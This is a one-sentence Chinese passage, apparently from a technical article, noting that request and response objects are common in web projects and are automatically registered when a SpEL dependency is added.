request、response 对象是 Web 项目的常客，在 Web 项目如果引入了 SpEL 的依赖，那么这两个对象会自动被注册进去。



































